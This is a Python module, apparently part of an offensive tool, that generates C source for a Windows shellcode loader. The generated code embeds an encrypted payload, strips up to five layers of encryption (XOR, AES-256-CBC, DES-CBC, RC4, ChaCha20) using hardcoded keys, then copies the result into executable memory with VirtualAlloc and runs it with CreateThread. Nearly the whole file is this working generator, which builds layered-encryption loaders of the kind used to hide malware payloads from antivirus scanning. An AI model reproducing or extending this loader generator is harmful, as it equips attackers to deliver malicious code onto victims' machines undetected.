#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
C/C++解密加载器模块：单一职责 - 仅实现C/C++解密加载器生成，遵循BaseLoader接口
"""
from core.loader.base_loader import BaseLoader
from core.encrypt.encrypt_manager import EncryptionHistory

class CDecryptLoader(BaseLoader):
    """C/C++解密加载器：单一职责 - 仅生成C/C++解密加载器（适配加密历史）"""
    @property
    def lang_name(self) -> str:
        return "C/C++"
    
    def generate_raw(self, shellcode_len: int) -> str:
        """（解密加载器可复用原始加载器逻辑，此处简化实现）"""
        from core.loader.raw_loader.c_raw_loader import CRawLoader
        return CRawLoader().generate_raw(shellcode_len)
    
    def generate_decrypt(self, shellcode_len: int, encryption_history: EncryptionHistory) -> str:
        """生成C/C++解密加载器内容（适配XOR/AES-256-CBC/DES-CBC/RC4/ChaCha20加密历史）"""
        encrypt_history = encryption_history.get_full_history()
        decrypt_functions = []
        decrypt_calls = []
        key_iv_definitions = []

        # 构建解密函数和调用逻辑（按加密逆序解密）
        for idx, encrypt_info in enumerate(reversed(encrypt_history), 1):
            alg = encrypt_info["alg"]
            params = encrypt_info["params"]

            if alg == "XOR":
                # XOR解密函数和参数定义
                key_hex = params["key_hex"]
                key_len = params["key_len"]
                key_def = "// XOR解密密钥（第" + str(idx) + "轮解密）\n"
                key_def += "unsigned char xor_key_" + str(idx) + "[] = {"
                key_def += ", ".join([f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)])
                key_def += "};\n"
                key_def += "int xor_key_len_" + str(idx) + " = " + str(key_len) + ";\n"
                key_iv_definitions.append(key_def)

                # 生成XOR解密函数
                xor_decrypt = "// XOR解密函数（第" + str(idx) + "轮）\n"
                xor_decrypt += "void xor_decrypt_" + str(idx) + "(unsigned char *shellcode, unsigned int *shellcode_len) {\n"
                xor_decrypt += "    // 检查输入参数有效性\n"
                xor_decrypt += "    if (shellcode == NULL || shellcode_len == NULL || *shellcode_len <= 0) {\n"
                xor_decrypt += "        return;\n"
                xor_decrypt += "    }\n"
                xor_decrypt += "    \n"
                xor_decrypt += "    for (unsigned int i = 0; i < *shellcode_len; i++) {\n"
                xor_decrypt += "        shellcode[i] ^= xor_key_" + str(idx) + "[i % xor_key_len_" + str(idx) + "];\n"
                xor_decrypt += "    }\n"
                xor_decrypt += "}\n"
                decrypt_functions.append(xor_decrypt)
                decrypt_calls.append("xor_decrypt_" + str(idx) + "(decrypt_buffer, &shellcode_len);")
            
            elif alg == "AES-256-CBC":
                # AES-256-CBC解密函数和参数定义（依赖Windows CryptoAPI）
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                # 构建AES密钥和IV的十六进制字符串列表
                aes_key_hex_list = [f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)]
                aes_iv_hex_list = [f"0x{iv_hex[i:i+2]}" for i in range(0, len(iv_hex), 2)]
                aes_key_str = ", ".join(aes_key_hex_list)
                aes_iv_str = ", ".join(aes_iv_hex_list)
                # 构建key_def字符串
                key_def = "// AES-256-CBC解密密钥和IV（第" + str(idx) + "轮解密）\n"
                key_def += "unsigned char aes_key_" + str(idx) + "[] = {" + aes_key_str + "};\n"
                key_def += "unsigned char aes_iv_" + str(idx) + "[] = {" + aes_iv_str + "};\n"
                key_iv_definitions.append(key_def)

                # 生成AES-256-CBC解密函数
                aes_decrypt = "// AES-256-CBC解密函数（第" + str(idx) + "轮，使用Windows CryptoAPI）\n"
                aes_decrypt += "unsigned char* aes_256_cbc_decrypt_" + str(idx) + "(unsigned char *shellcode, unsigned int *shellcode_len) {\n"
                aes_decrypt += "    HCRYPTPROV hProv = 0;\n"
                aes_decrypt += "    HCRYPTKEY hKey = 0;\n"
                aes_decrypt += "    DWORD dwBufLen = 0;\n"
                aes_decrypt += "    unsigned char *decrypted_data = NULL;\n"
                aes_decrypt += "    \n"
                aes_decrypt += "    if (shellcode == NULL || shellcode_len == NULL || *shellcode_len <= 0) {\n"
                aes_decrypt += "        return NULL;\n"
                aes_decrypt += "    }\n"
                aes_decrypt += "    \n"
                aes_decrypt += "    dwBufLen = (DWORD)*shellcode_len;\n"
                aes_decrypt += "    \n"
                aes_decrypt += "    // 获取加密服务提供程序\n"
                aes_decrypt += "    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {\n"
                aes_decrypt += "        goto cleanup;\n"
                aes_decrypt += "    }\n"
                aes_decrypt += "    \n"
                aes_decrypt += "    // 创建AES-256密钥\n"
                aes_decrypt += "    struct {\n"
                aes_decrypt += "        BLOBHEADER hdr;\n"
                aes_decrypt += "        DWORD dwKeyLength;\n"
                aes_decrypt += "        BYTE rgbKeyData[32];\n"
                aes_decrypt += "    } keyBlob;\n"
                aes_decrypt += "    \n"
                aes_decrypt += "    memset(&keyBlob, 0, sizeof(keyBlob));\n"
                aes_decrypt += "    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;\n"
                aes_decrypt += "    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;\n"
                aes_decrypt += "    keyBlob.hdr.reserved = 0;\n"
                aes_decrypt += "    keyBlob.hdr.aiKeyAlg = CALG_AES_256;\n"
                aes_decrypt += "    keyBlob.dwKeyLength = 32;\n"
                aes_decrypt += "    memcpy(keyBlob.rgbKeyData, aes_key_" + str(idx) + ", 32);\n"
                aes_decrypt += "    \n"
                aes_decrypt += "    // 导入密钥\n"
                aes_decrypt += "    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {\n"
                aes_decrypt += "        goto cleanup;\n"
                aes_decrypt += "    }\n"
                aes_decrypt += "    \n"
                aes_decrypt += "    // 设置IV\n"
                aes_decrypt += "    if (!CryptSetKeyParam(hKey, KP_IV, aes_iv_" + str(idx) + ", 0)) {\n"
                aes_decrypt += "        goto cleanup;\n"
                aes_decrypt += "    }\n"
                aes_decrypt += "    \n"
                aes_decrypt += "    // 分配缓冲区\n"
                aes_decrypt += "    decrypted_data = (unsigned char *)malloc(dwBufLen);\n"
                aes_decrypt += "    if (decrypted_data == NULL) {\n"
                aes_decrypt += "        goto cleanup;\n"
                aes_decrypt += "    }\n"
                aes_decrypt += "    memcpy(decrypted_data, shellcode, dwBufLen);\n"
                aes_decrypt += "    \n"
                aes_decrypt += "    // 解密 - 尝试不同的策略\n"
                aes_decrypt += "    DWORD temp_len = dwBufLen;\n"
                aes_decrypt += "    BOOL decryption_success = FALSE;\n"
                aes_decrypt += "    \n"
                aes_decrypt += "    // 首先尝试不使用自动填充处理（因为DES-CBC解密后的数据可能已经是16字节的倍数）\n"
                aes_decrypt += "    if (CryptDecrypt(hKey, 0, FALSE, 0, decrypted_data, &temp_len)) {\n"
                aes_decrypt += "        decryption_success = TRUE;\n"
                aes_decrypt += "        \n"
                aes_decrypt += "        // 手动移除PKCS7填充\n"
                aes_decrypt += "        if (temp_len > 0) {\n"
                aes_decrypt += "            // 检查并移除PKCS7填充\n"
                aes_decrypt += "            unsigned char padding = decrypted_data[temp_len - 1];\n"
                aes_decrypt += "            \n"
                aes_decrypt += "            if (padding > 0 && padding <= 16) {\n"
                aes_decrypt += "                BOOL valid_padding = TRUE;\n"
                aes_decrypt += "                \n"
                aes_decrypt += "                // 验证填充是否有效\n"
                aes_decrypt += "                for (DWORD i = 1; i <= padding; i++) {\n"
                aes_decrypt += "                    if (temp_len < i || decrypted_data[temp_len - i] != padding) {\n"
                aes_decrypt += "                        valid_padding = FALSE;\n"
                aes_decrypt += "                        break;\n"
                aes_decrypt += "                    }\n"
                aes_decrypt += "                }\n"
                aes_decrypt += "                \n"
                aes_decrypt += "                if (valid_padding) {\n"
                aes_decrypt += "                    temp_len -= padding;\n"
                aes_decrypt += "                } else {\n"
                aes_decrypt += "                }\n"
                aes_decrypt += "            } else {\n"
                aes_decrypt += "            }\n"
                aes_decrypt += "        }\n"
                aes_decrypt += "    } else {\n"
                aes_decrypt += "        // 然后尝试使用自动填充处理\n"
                aes_decrypt += "        temp_len = dwBufLen;\n"
                aes_decrypt += "        if (CryptDecrypt(hKey, 0, TRUE, 0, decrypted_data, &temp_len)) {\n"
                aes_decrypt += "            decryption_success = TRUE;\n"
                aes_decrypt += "        } else {\n"
                aes_decrypt += "            free(decrypted_data);\n"
                aes_decrypt += "            decrypted_data = NULL;\n"
                aes_decrypt += "            goto cleanup;\n"
                aes_decrypt += "        }\n"
                aes_decrypt += "    }\n"
                aes_decrypt += "    \n"
                aes_decrypt += "    *shellcode_len = (unsigned int)temp_len;\n"
                aes_decrypt += "    \n"
                aes_decrypt += "cleanup:\n"
                aes_decrypt += "    if (hKey) CryptDestroyKey(hKey);\n"
                aes_decrypt += "    if (hProv) CryptReleaseContext(hProv, 0);\n"
                aes_decrypt += "    return decrypted_data;\n"
                aes_decrypt += "}\n"
                decrypt_functions.append(aes_decrypt)
                decrypt_calls.append("unsigned char *decrypted_data_" + str(idx) + " = aes_256_cbc_decrypt_" + str(idx) + "(decrypt_buffer, &shellcode_len); if (decrypted_data_" + str(idx) + ") { memcpy(decrypt_buffer, decrypted_data_" + str(idx) + ", shellcode_len); free(decrypted_data_" + str(idx) + "); } else { free(decrypt_buffer); return 1; }")
            
            elif alg == "DES-CBC":
                # DES-CBC解密函数和参数定义（依赖Windows CryptoAPI）
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                key_def = "// DES-CBC解密密钥和IV（第" + str(idx) + "轮解密）\n"
                key_def += "unsigned char des_key_" + str(idx) + "[] = {"
                key_def += ", ".join([f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)])
                key_def += "};\n"
                key_def += "unsigned char des_iv_" + str(idx) + "[] = {"
                key_def += ", ".join([f"0x{iv_hex[i:i+2]}" for i in range(0, len(iv_hex), 2)])
                key_def += "};\n"
                key_iv_definitions.append(key_def)

                # 生成DES-CBC解密函数
                des_decrypt = "// DES-CBC解密函数（第" + str(idx) + "轮，使用Windows CryptoAPI）\n"
                des_decrypt += "unsigned char* des_cbc_decrypt_" + str(idx) + "(unsigned char *shellcode, unsigned int *shellcode_len) {\n"
                des_decrypt += "    HCRYPTPROV hProv = 0;\n"
                des_decrypt += "    HCRYPTKEY hKey = 0;\n"
                des_decrypt += "    DWORD dwBufLen = 0;\n"
                des_decrypt += "    unsigned char *decrypted_data = NULL;\n"
                des_decrypt += "\n"
                des_decrypt += "    if (shellcode == NULL || shellcode_len == NULL || *shellcode_len <= 0) {\n"
                des_decrypt += "        return NULL;\n"
                des_decrypt += "    }\n"
                des_decrypt += "\n"
                des_decrypt += "    dwBufLen = (DWORD)*shellcode_len;\n"
                des_decrypt += "\n"
                des_decrypt += "    // 获取加密服务提供程序\n"
                des_decrypt += "    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {\n"
                des_decrypt += "        goto cleanup;\n"
                des_decrypt += "    }\n"
                des_decrypt += "\n"
                des_decrypt += "    // 创建DES密钥\n"
                des_decrypt += "    struct {\n"
                des_decrypt += "        BLOBHEADER hdr;\n"
                des_decrypt += "        DWORD dwKeyLength;\n"
                des_decrypt += "        BYTE rgbKeyData[8];\n"
                des_decrypt += "    } keyBlob;\n"
                des_decrypt += "\n"
                des_decrypt += "    memset(&keyBlob, 0, sizeof(keyBlob));\n"
                des_decrypt += "    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;\n"
                des_decrypt += "    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;\n"
                des_decrypt += "    keyBlob.hdr.reserved = 0;\n"
                des_decrypt += "    keyBlob.hdr.aiKeyAlg = CALG_DES;\n"
                des_decrypt += "    keyBlob.dwKeyLength = 8;\n"
                des_decrypt += "    memcpy(keyBlob.rgbKeyData, des_key_" + str(idx) + ", 8);\n"
                des_decrypt += "\n"
                des_decrypt += "    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {\n"
                des_decrypt += "        goto cleanup;\n"
                des_decrypt += "    }\n"
                des_decrypt += "\n"
                des_decrypt += "    // 设置IV\n"
                des_decrypt += "    if (!CryptSetKeyParam(hKey, KP_IV, des_iv_" + str(idx) + ", 0)) {\n"
                des_decrypt += "        goto cleanup;\n"
                des_decrypt += "    }\n"
                des_decrypt += "\n"
                des_decrypt += "    // 分配缓冲区\n"
                des_decrypt += "    decrypted_data = (unsigned char *)malloc(dwBufLen);\n"
                des_decrypt += "    if (decrypted_data == NULL) {\n"
                des_decrypt += "        goto cleanup;\n"
                des_decrypt += "    }\n"
                des_decrypt += "    memcpy(decrypted_data, shellcode, dwBufLen);\n"
                des_decrypt += "\n"
                des_decrypt += "    // 解密 - 尝试不同的策略\n"
                des_decrypt += "    BOOL decryption_success = FALSE;\n"
                des_decrypt += "    DWORD temp_len = dwBufLen;\n"
                des_decrypt += "    // 首先尝试不使用最后一个块标志（因为加密时可能没有添加填充）\n"
                des_decrypt += "    if (CryptDecrypt(hKey, 0, FALSE, 0, decrypted_data, &temp_len)) {\n"
                des_decrypt += "        decryption_success = TRUE;\n"
                des_decrypt += "    } else {\n"
                des_decrypt += "        // 如果失败，尝试使用最后一个块标志（处理添加了填充的情况）\n"
                des_decrypt += "        temp_len = dwBufLen;\n"
                des_decrypt += "        if (CryptDecrypt(hKey, 0, TRUE, 0, decrypted_data, &temp_len)) {\n"
                des_decrypt += "            decryption_success = TRUE;\n"
                des_decrypt += "        } else {\n"
                des_decrypt += "            free(decrypted_data);\n"
                des_decrypt += "            decrypted_data = NULL;\n"
                des_decrypt += "            goto cleanup;\n"
                des_decrypt += "        }\n"
                des_decrypt += "    }\n"
                des_decrypt += "    // 手动移除PKCS7填充\n"
                des_decrypt += "    if (decryption_success && temp_len > 0) {\n"
                des_decrypt += "        unsigned char padding = decrypted_data[temp_len - 1];\n"
                des_decrypt += "        if (padding > 0 && padding <= 8) {\n"
                des_decrypt += "            BOOL valid_padding = TRUE;\n"
                des_decrypt += "            for (DWORD i = 1; i <= padding; i++) {\n"
                des_decrypt += "                if (temp_len < i || decrypted_data[temp_len - i] != padding) {\n"
                des_decrypt += "                    valid_padding = FALSE;\n"
                des_decrypt += "                    break;\n"
                des_decrypt += "                }\n"
                des_decrypt += "            }\n"
                des_decrypt += "            if (valid_padding) {\n"
                des_decrypt += "                temp_len -= padding;\n"
                des_decrypt += "            } else {\n"
                des_decrypt += "            }\n"
                des_decrypt += "        } else {\n"
                des_decrypt += "        }\n"
                des_decrypt += "    }\n"
                des_decrypt += "\n"
                des_decrypt += "    // 更新dwBufLen为处理后的长度\n"
                des_decrypt += "    dwBufLen = temp_len;\n"
                des_decrypt += "\n"
                des_decrypt += "    // 确保输出长度是16的倍数（AES块大小），以便后续AES-256-CBC解密\n"
                des_decrypt += "    if (dwBufLen % 16 != 0) {\n"
                des_decrypt += "        unsigned int original_len = dwBufLen;\n"
                des_decrypt += "        dwBufLen -= dwBufLen % 16;\n"
                des_decrypt += "    }\n"
                des_decrypt += "\n"
                des_decrypt += "    *shellcode_len = (unsigned int)dwBufLen;\n"
                des_decrypt += "\n"
                des_decrypt += "cleanup:\n"
                des_decrypt += "    if (hKey) CryptDestroyKey(hKey);\n"
                des_decrypt += "    if (hProv) CryptReleaseContext(hProv, 0);\n"
                des_decrypt += "    return decrypted_data;\n"
                des_decrypt += "}\n"
                decrypt_functions.append(des_decrypt)
                decrypt_calls.append("unsigned char *decrypted_data_" + str(idx) + " = des_cbc_decrypt_" + str(idx) + "(decrypt_buffer, &shellcode_len); if (decrypted_data_" + str(idx) + ") { memcpy(decrypt_buffer, decrypted_data_" + str(idx) + ", shellcode_len); free(decrypted_data_" + str(idx) + "); } else { free(decrypt_buffer); return 1; }")
            
            elif alg == "RC4":
                # RC4解密函数和参数定义
                key_hex = params["key_hex"]
                key_len = params["key_len"]
                key_def = "// RC4解密密钥（第" + str(idx) + "轮解密）\n"
                key_def += "unsigned char rc4_key_" + str(idx) + "[] = {"
                key_def += ", ".join([f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)])
                key_def += "};\n"
                key_def += "int rc4_key_len_" + str(idx) + " = " + str(key_len) + ";\n"
                key_iv_definitions.append(key_def)

                # 生成RC4解密函数
                rc4_decrypt = "// RC4解密函数（第" + str(idx) + "轮）\n"
                rc4_decrypt += "void rc4_decrypt_" + str(idx) + "(unsigned char *shellcode, unsigned int *shellcode_len) {\n"
                rc4_decrypt += "    // 检查输入参数有效性\n"
                rc4_decrypt += "    if (shellcode == NULL || shellcode_len == NULL || *shellcode_len <= 0) {\n"
                rc4_decrypt += "        return;\n"
                rc4_decrypt += "    }\n"
                rc4_decrypt += "    \n"
                rc4_decrypt += "    // 初始化S盒\n"
                rc4_decrypt += "    unsigned char s_box[256];\n"
                rc4_decrypt += "    for (unsigned int i = 0; i < 256; i++) {\n"
                rc4_decrypt += "        s_box[i] = i;\n"
                rc4_decrypt += "    }\n"
                rc4_decrypt += "    unsigned int j = 0;\n"
                rc4_decrypt += "    for (unsigned int i = 0; i < 256; i++) {\n"
                rc4_decrypt += "        j = (j + s_box[i] + rc4_key_" + str(idx) + "[i % rc4_key_len_" + str(idx) + "]) % 256;\n"
                rc4_decrypt += "        unsigned char temp = s_box[i];\n"
                rc4_decrypt += "        s_box[i] = s_box[j];\n"
                rc4_decrypt += "        s_box[j] = temp;\n"
                rc4_decrypt += "    }\n"
                rc4_decrypt += "    \n"
                rc4_decrypt += "    // 解密过程\n"
                rc4_decrypt += "    unsigned int i = 0;\n"
                rc4_decrypt += "    j = 0;\n"
                rc4_decrypt += "    for (unsigned int k = 0; k < *shellcode_len; k++) {\n"
                rc4_decrypt += "        i = (i + 1) % 256;\n"
                rc4_decrypt += "        j = (j + s_box[i]) % 256;\n"
                rc4_decrypt += "        unsigned char temp = s_box[i];\n"
                rc4_decrypt += "        s_box[i] = s_box[j];\n"
                rc4_decrypt += "        s_box[j] = temp;\n"
                rc4_decrypt += "        unsigned char t = (s_box[i] + s_box[j]) % 256;\n"
                rc4_decrypt += "        unsigned char k_value = s_box[t];\n"
                rc4_decrypt += "        shellcode[k] ^= k_value;\n"
                rc4_decrypt += "    }\n"
                rc4_decrypt += "}\n"
                decrypt_functions.append(rc4_decrypt)
                decrypt_calls.append("rc4_decrypt_" + str(idx) + "(decrypt_buffer, &shellcode_len);")
            
            elif alg == "ChaCha20":
                # ChaCha20解密函数和参数定义
                key_hex = params["key_hex"]
                nonce_hex = params["nonce_hex"]
                key_def = "// ChaCha20解密密钥和nonce（第" + str(idx) + "轮解密）\n"
                key_def += "unsigned char chacha20_key_" + str(idx) + "[] = {"
                key_def += ", ".join([f"0x{key_hex[i:i+2]}" for i in range(0, len(key_hex), 2)])
                key_def += "};\n"
                key_def += "unsigned char chacha20_nonce_" + str(idx) + "[] = {"
                key_def += ", ".join([f"0x{nonce_hex[i:i+2]}" for i in range(0, len(nonce_hex), 2)])
                key_def += "};\n"
                key_iv_definitions.append(key_def)

                # 生成ChaCha20解密函数
                chacha20_decrypt = "// ChaCha20解密函数（第" + str(idx) + "轮，原生实现）\n"
                chacha20_decrypt += "// ChaCha20轮函数\n"
                chacha20_decrypt += "static void chacha20_quarter_round(uint32_t *a, uint32_t *b, uint32_t *c, uint32_t *d) {\n"
                chacha20_decrypt += "    *a += *b; *d ^= *a; *d = (*d << 16) | (*d >> 16);\n"
                chacha20_decrypt += "    *c += *d; *b ^= *c; *b = (*b << 12) | (*b >> 20);\n"
                chacha20_decrypt += "    *a += *b; *d ^= *a; *d = (*d << 8) | (*d >> 24);\n"
                chacha20_decrypt += "    *c += *d; *b ^= *c; *b = (*b << 7) | (*b >> 25);\n"
                chacha20_decrypt += "}\n\n"
                chacha20_decrypt += "// ChaCha20块生成函数\n"
                chacha20_decrypt += "static void chacha20_block(uint32_t *state, uint8_t *output) {\n"
                chacha20_decrypt += "    uint32_t working_state[16];\n"
                chacha20_decrypt += "    for (int i = 0; i < 16; i++) {\n"
                chacha20_decrypt += "        working_state[i] = state[i];\n"
                chacha20_decrypt += "    }\n"
                chacha20_decrypt += "    \n"
                chacha20_decrypt += "    // 执行20轮\n"
                chacha20_decrypt += "    for (int i = 0; i < 10; i++) {\n"
                chacha20_decrypt += "        // 列混淆\n"
                chacha20_decrypt += "        chacha20_quarter_round(&working_state[0], &working_state[4], &working_state[8], &working_state[12]);\n"
                chacha20_decrypt += "        chacha20_quarter_round(&working_state[1], &working_state[5], &working_state[9], &working_state[13]);\n"
                chacha20_decrypt += "        chacha20_quarter_round(&working_state[2], &working_state[6], &working_state[10], &working_state[14]);\n"
                chacha20_decrypt += "        chacha20_quarter_round(&working_state[3], &working_state[7], &working_state[11], &working_state[15]);\n"
                chacha20_decrypt += "        // 对角线混淆\n"
                chacha20_decrypt += "        chacha20_quarter_round(&working_state[0], &working_state[5], &working_state[10], &working_state[15]);\n"
                chacha20_decrypt += "        chacha20_quarter_round(&working_state[1], &working_state[6], &working_state[11], &working_state[12]);\n"
                chacha20_decrypt += "        chacha20_quarter_round(&working_state[2], &working_state[7], &working_state[8], &working_state[13]);\n"
                chacha20_decrypt += "        chacha20_quarter_round(&working_state[3], &working_state[4], &working_state[9], &working_state[14]);\n"
                chacha20_decrypt += "    }\n"
                chacha20_decrypt += "    \n"
                chacha20_decrypt += "    // 与原始状态相加\n"
                chacha20_decrypt += "    for (int i = 0; i < 16; i++) {\n"
                chacha20_decrypt += "        working_state[i] += state[i];\n"
                chacha20_decrypt += "    }\n"
                chacha20_decrypt += "    \n"
                chacha20_decrypt += "    // 转换为字节\n"
                chacha20_decrypt += "    for (int i = 0; i < 16; i++) {\n"
                chacha20_decrypt += "        output[4 * i] = (uint8_t)(working_state[i] & 0xFF);\n"
                chacha20_decrypt += "        output[4 * i + 1] = (uint8_t)((working_state[i] >> 8) & 0xFF);\n"
                chacha20_decrypt += "        output[4 * i + 2] = (uint8_t)((working_state[i] >> 16) & 0xFF);\n"
                chacha20_decrypt += "        output[4 * i + 3] = (uint8_t)((working_state[i] >> 24) & 0xFF);\n"
                chacha20_decrypt += "    }\n"
                chacha20_decrypt += "}\n\n"
                chacha20_decrypt += "// ChaCha20解密函数\n"
                chacha20_decrypt += "void chacha20_decrypt_" + str(idx) + "(unsigned char *shellcode, unsigned int *shellcode_len) {\n"
                chacha20_decrypt += "    // 检查输入参数有效性\n"
                chacha20_decrypt += "    if (shellcode == NULL || shellcode_len == NULL || *shellcode_len <= 0) {\n"
                chacha20_decrypt += "        return;\n"
                chacha20_decrypt += "    }\n"
                chacha20_decrypt += "    \n"
                chacha20_decrypt += "    uint32_t state[16];\n"
                chacha20_decrypt += "    uint8_t key[32];\n"
                chacha20_decrypt += "    uint8_t nonce[16];\n"
                chacha20_decrypt += "    uint8_t keystream[64];\n"
                chacha20_decrypt += "    int counter = 0;\n"
                chacha20_decrypt += "    \n"
                chacha20_decrypt += "    // 复制密钥和nonce\n";
                chacha20_decrypt += "    memcpy(key, chacha20_key_" + str(idx) + ", 32);\n";
                chacha20_decrypt += "    memcpy(nonce, chacha20_nonce_" + str(idx) + ", 16);\n";
                chacha20_decrypt += "    \n"
                chacha20_decrypt += "    // 初始化状态\n"
                chacha20_decrypt += "    state[0] = 0x61707865; // \"expa\"\n"
                chacha20_decrypt += "    state[1] = 0x3320646E; // \"nd 3\"\n"
                chacha20_decrypt += "    state[2] = 0x79622D32; // \"2-by\"\n"
                chacha20_decrypt += "    state[3] = 0x6B206574; // \"te k\"\n"
                chacha20_decrypt += "    \n"
                chacha20_decrypt += "    // 复制密钥（32字节）\n"
                chacha20_decrypt += "    for (int i = 0; i < 8; i++) {\n"
                chacha20_decrypt += "        state[4 + i] = ((uint32_t*)key)[i];\n"
                chacha20_decrypt += "    }\n"
                chacha20_decrypt += "    \n"
                chacha20_decrypt += "    // 复制16字节nonce（与cryptography库保持一致）\n"
                chacha20_decrypt += "    for (int i = 0; i < 4; i++) {\n"
                chacha20_decrypt += "        state[12 + i] = ((uint32_t*)nonce)[i];\n"
                chacha20_decrypt += "    }\n"
                chacha20_decrypt += "    \n"
                chacha20_decrypt += "    // 生成密钥流并解密\n"
                chacha20_decrypt += "    for (unsigned int i = 0; i < *shellcode_len; i += 64) {\n"
                chacha20_decrypt += "        // 生成64字节密钥流\n"
                chacha20_decrypt += "        chacha20_block(state, keystream);\n"
                chacha20_decrypt += "        \n"
                chacha20_decrypt += "        // 异或解密\n"
                chacha20_decrypt += "        unsigned int block_size = (*shellcode_len - i < 64) ? (*shellcode_len - i) : 64;\n"
                chacha20_decrypt += "        for (unsigned int j = 0; j < block_size; j++) {\n"
                chacha20_decrypt += "            shellcode[i + j] ^= keystream[j];\n"
                chacha20_decrypt += "        }\n"
                chacha20_decrypt += "        \n"
                chacha20_decrypt += "        // 递增计数器（ChaCha20算法要求）\n"
                chacha20_decrypt += "        state[12]++;\n"
                chacha20_decrypt += "        if (state[12] == 0) {\n"
                chacha20_decrypt += "            state[13]++;\n"
                chacha20_decrypt += "            if (state[13] == 0) {\n"
                chacha20_decrypt += "                state[14]++;\n"
                chacha20_decrypt += "                if (state[14] == 0) {\n"
                chacha20_decrypt += "                    state[15]++;\n"
                chacha20_decrypt += "                }\n"
                chacha20_decrypt += "            }\n"
                chacha20_decrypt += "        }\n"
                chacha20_decrypt += "    }\n"
                chacha20_decrypt += "}\n"
                decrypt_functions.append(chacha20_decrypt)
                decrypt_calls.append("chacha20_decrypt_" + str(idx) + "(decrypt_buffer, &shellcode_len);")

        # 构建主函数
        main_code = "#define _CRT_SECURE_NO_WARNINGS\n\nint main() {\n"
        main_code += "    unsigned char shellcode[] = { /* 此处将替换为字节数组格式的shellcode */ };\n"
        main_code += "    unsigned int shellcode_len = sizeof(shellcode);/* shellcode_len同步替换 */\n"
        main_code += "\n"
        main_code += "    // 分配足够大的缓冲区以存储解密后的shellcode\n"
        main_code += "    // 缓冲区大小至少为原始shellcode长度的2倍\n"
        main_code += "    unsigned int max_buf_size = shellcode_len * 2;\n"
        main_code += "    unsigned char *decrypt_buffer = (unsigned char *)malloc(max_buf_size);\n"
        main_code += "    if (decrypt_buffer == NULL) {\n"
        main_code += "        return 1;\n"
        main_code += "    }\n"
        main_code += "    memcpy(decrypt_buffer, shellcode, shellcode_len);\n"
        main_code += "\n"
        main_code += "    // 检查shellcode是否为空\n"
        main_code += "    if (shellcode_len == 0) {\n"
        main_code += "        free(decrypt_buffer);\n"
        main_code += "        return 1;\n"
        main_code += "    }\n"
        main_code += "\n"
        main_code += "    // 执行解密操作\n"
        for call in decrypt_calls:
            main_code += "    " + call + "\n"
        main_code += "\n"
        main_code += "    // 检查解密后的shellcode是否为空\n"
        main_code += "    if (shellcode_len == 0) {\n"
        main_code += "        free(decrypt_buffer);\n"
        main_code += "        return 1;\n"
        main_code += "    }\n"
        main_code += "\n"
        main_code += "    // 分配可执行内存\n"
        main_code += "    LPVOID mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
        main_code += "    if (mem == NULL) {\n"
        main_code += "        free(decrypt_buffer);\n"
        main_code += "        return 1;\n"
        main_code += "    }\n"
        main_code += "\n"
        main_code += "    // 复制解密后的shellcode到内存\n"
        main_code += "    RtlMoveMemory(mem, decrypt_buffer, shellcode_len);\n"
        main_code += "\n"
        main_code += "    // 使用CreateThread执行shellcode\n"
        main_code += "    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);\n"
        main_code += "    if (hThread == NULL) {\n"
        main_code += "        VirtualFree(mem, 0, MEM_RELEASE);\n"
        main_code += "        free(decrypt_buffer);\n"
        main_code += "        return 1;\n"
        main_code += "    }\n"
        main_code += "\n"
        main_code += "    // 等待线程执行完成\n"
        main_code += "    WaitForSingleObject(hThread, INFINITE);\n"
        main_code += "\n"
        main_code += "    // 清理资源\n"
        main_code += "    CloseHandle(hThread);\n"
        main_code += "    VirtualFree(mem, 0, MEM_RELEASE);\n"
        main_code += "    free(decrypt_buffer);\n"
        main_code += "\n"
        main_code += "    return 0;\n"
        main_code += "}\n"

        # 组合所有部分
        loader_code = "#define _CRT_SECURE_NO_WARNINGS\n"
        loader_code += "#include <windows.h>\n"
        loader_code += "#include <stdio.h>\n"
        loader_code += "#include <string.h>\n"
        loader_code += "#include <stdint.h>\n\n"

        loader_code += "\n".join(key_iv_definitions)
        loader_code += "\n"
        loader_code += "\n".join(decrypt_functions)
        loader_code += "\n"
        loader_code += main_code

        return loader_code
